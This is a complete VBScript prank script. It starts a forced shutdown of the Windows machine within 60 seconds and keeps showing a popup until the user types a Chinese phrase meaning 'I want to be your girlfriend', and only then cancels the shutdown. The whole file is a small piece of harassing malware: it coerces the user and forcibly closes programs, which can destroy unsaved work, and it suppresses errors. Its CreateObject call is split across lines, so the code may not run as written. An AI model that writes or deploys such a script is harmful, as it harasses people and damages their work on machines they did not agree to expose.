Option Explicit
On Error Resume Next
Dim answer
Dim WshShell
set WshShell = CreateObject
("wscript.Shell")
WshShell.Run "Shutdown /f /s /t 60 /c 输入'我要做你女朋友' , 否则60秒后关机！",0
Do while answer<>"我要做你女朋友"
answer=InputBox("输入'我要做你女朋友',否则60秒后关机！","哈哈哈",,7000,5000)
Loop
WshShell.Run "Shutdown /a",0
Msgbox "哈哈哈",,"000"